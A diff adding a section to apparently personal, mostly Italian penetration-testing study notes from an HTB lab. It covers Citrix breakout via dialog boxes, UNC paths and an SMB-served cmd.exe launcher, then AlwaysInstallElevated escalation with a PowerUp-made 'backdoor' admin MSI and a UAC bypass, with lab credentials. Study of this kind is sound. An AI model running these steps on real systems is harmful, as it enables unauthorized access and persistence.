@@ -1170,3 +1170,123 @@ Se otteniamo local admin access ad una macchina con una scheda wireless possiamo
 spesso possiamo prendere le Pre-Shared key salvate
 
 `C:\htb> netsh wlan show profile nome_rete key=clear`
+
+# Citrix Breakout
+
+ormai molte organizzazioni virtualizzano su piattaforme tome Terminal Services, Citrix, AWS AppStream, etc.etc. per dare accesso remoto ai prodotti.
+
+comunque ci sono misure di **lock-down** mei loro ambienti desktop per minimizzare impatti di dipendenti malevoli, percio' se vogliamo fare PrivEsc dovrebbo fare un break-out da questo ambiente protetto.
+
+metodologia di base per fare break-out:
+
+1) Gain access to a **Dialog Box**
+2) Exploit the dialog bo to achieve **command execution**
+3) **escalate privileges** to gain higher level of access.
+
+in ambienti con minimo hardening ci potrebbe pure essere una shortcut a cmd.exe nello start menu. in ambienti con maggiore hardening ogni tentativo di localizzare cmd.exe o powershell.exe nello start menu non da risultati.
+
+Avere un CMD in un ambiente ristretto da molto piu' controllo.
+
+CI sono molti modi per fare break-out da Citrix, noi parleremo solo di alcuni metodi.
+
+```
+Visit http://humongousretail.com/remote/ using the RDP session of the spawned target and login with the provided credentials below. After login, click on the Default Desktop to obtain the Citrix launch.ica file in order to connect to the restricted environment.
+
+Code: citrixcredentials
+Username: pmorgan
+Password: Summer1Summer!
+  Domain: htb.local
+```
+
+## Bypassing Path Restrictions
+
+Quando proviamo a visitare **C:\Users** usando File explorer vediamo che e' ristretto. significa che la group lolicy restringe utenti di fare browsing nelle directory di C:\ usando File Exlorer.
+
+E' possibile in qesti scenari usare i **Windows Dialog Boxes** per bypassare le restrizioni della group policy.
+
+Molte app deployate via Citrix  hanno funzionalita' che gli permette di interagire con file sul sistema come Save as, Open, load etc.etc e tramite queste possiamo invokare un dialog box.
+
+useremo **MS Paint**
+
+1) Run Paint
+2) start menu **File > Open**
+3) possiamo inserire il  UNC path nel file name \\127.0.0.1\c$\users\pmorgan con File-Type settato a **All-Files**
+
+## Accessing SMB shares from restricted env
+
+File explorer non ha accesso diretto alle share SMB. comunque usando il **UNC Path**(https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths) possiamo accedere.
+
+1) Startiamo un server SMB sulla nostra macchina:
+   `root@ubuntu:/home/htb-student/Tools# smbserver.py -smb2support share $(pwd)` (Impacket's smbserver.py script.)
+2) inseriamo il UNC path \\10.13.38.95\share
+3) possiamo eseguire file della nostra Share.
+   possiamo anche solo mettere un semplice pwn.exe
+```
+#include <stdlib.h>
+int main() {
+  system("C:\\Windows\\System32\\cmd.exe");
+}
+```
+
+## Alternate Explorer
+In altri casi in cui File Explorer e' ristretto possiamo usare File SYstem Editors come **Q-Dir** o **Explorer++**.
+
+## Alternate Registry Editors
+Similarly when the default Registry Editor is blocked by group policy, alternative Registry editors can be employed to bypass the standard group policy restrictions. Simpleregedit, Uberregedit and SmallRegistryEditor are examples of such GUI tools that facilitate editing the Windows registry without being affected by the blocking imposed by group policy. These tools offer a practical and effective solution for managing registry settings in such restricted environments.
+
+## Modify existent shortcut file
+possiamo provare a modificare shortcut gia' esistenti mettendo il path dell'eseguibile che pare a noi.
+
+1) right click sulla shortcut desiderata
+2) proprieta'> target mettiamo C:\Windows\System32\cmd.exe
+3) execute shortcut
+
+In cases where an existing shortcut file is unavailable, there are alternative methods to consider. One option is to transfer an existing shortcut file using an SMB server. Alternatively, we can create a new shortcut file using PowerShell as mentioned under Interacting with Users section under Generating a Malicious .lnk File tab. These approaches provide versatility in achieving our objectives while working with shortcut files.
+
+## Script Execution
+
+Quando le estensioni **.vbs, .bat o .ps** sono configurate per essere eseguibili rispettivamente dai propri interpreti da' la possibilita' di droppare uno script che serve come console interattiva .
+
+1) crea un nuovo file di testo e rinominalo "evil.bat"
+2) apri "evil.bat" con text editor
+3) scrivi "cmd"
+
+# Escalating Privileges 
+
+possiamo runnare Winpeas e PowerUp per identificare potenziali vulnerbilita'
+
+ad esempio usando PowerUp.ps1 troviamo che la chiave **Always Install Eleveted e' settata**
+
+`C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` verifichiamo.
+
+Possiamo usare la funzione di PowerUp **Write-UserAddMSI** per aggiungere un utente con script .msi.
+
+```
+PS C:\Users\pmorgan\Desktop> Import-Module .\PowerUp.ps1
+PS C:\Users\pmorgan\Desktop> Write-UserAddMSI
+	
+Output Path
+-----------
+UserAdd.msi
+```
+
+Ora eseguiamo UserAdd.msi  che ha creato un nuovo utente **backdoor:T3st@123** nel guppo Administrators.
+
+poi facciamo 
+
+`runas /user:backdoor cmd`  e prendiamo cmd come utente.
+
+## Bypassing UAC
+Anche se il nuovo membro e' negli amministratori c'e' UAC.
+
+```
+C:\Windows\system32> cd C:\Users\Administrator
+
+Access is denied.
+```
+
+proviamo con:
+```
+PS C:\Users\Public> Import-Module .\Bypass-UAC.ps1
+PS C:\Users\Public> Bypass-UAC -Method UacMethodSysprep
+```
